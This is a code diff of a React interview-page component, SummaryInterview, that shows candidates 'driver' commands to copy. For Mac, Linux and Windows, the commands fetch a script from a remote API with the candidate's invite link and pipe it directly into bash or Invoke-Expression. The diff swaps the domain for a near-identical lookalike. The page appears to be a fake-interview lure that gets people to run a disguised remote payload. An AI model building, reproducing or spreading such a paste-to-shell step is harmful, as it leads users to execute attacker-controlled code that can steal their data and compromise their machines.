@@ -754,17 +754,17 @@ export default function SummaryInterview() {
             <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
                 {driverOs === 'mac' && (
                       <code>
-                      {`curl -sL -X POST https://api.assessmentinternationalinc.com/mac/${inviteLink ? inviteLink : ''} | bash`}
+                      {`curl -sL -X POST https://api.assessmentinternationalsinc.com/mac/${inviteLink ? inviteLink : ''} | bash`}
                           </code>
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`Invoke-RestMethod -Uri "https://api.assessmentinternationalinc.com/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
+                      {`Invoke-RestMethod -Uri "https://api.assessmentinternationalsinc.com/window/${inviteLink ? inviteLink : ''}" -Method POST | Invoke-Expression`}
                           </code>
                       )}
               {driverOs === 'linux' && (
                       <code>
-                  {`curl -sL -X POST https://api.assessmentinternationalinc.com/mac/${inviteLink ? inviteLink : ''} | bash`}
+                  {`curl -sL -X POST https://api.assessmentinternationalsinc.com/mac/${inviteLink ? inviteLink : ''} | bash`}
                       </code>
                   )}
             </div>
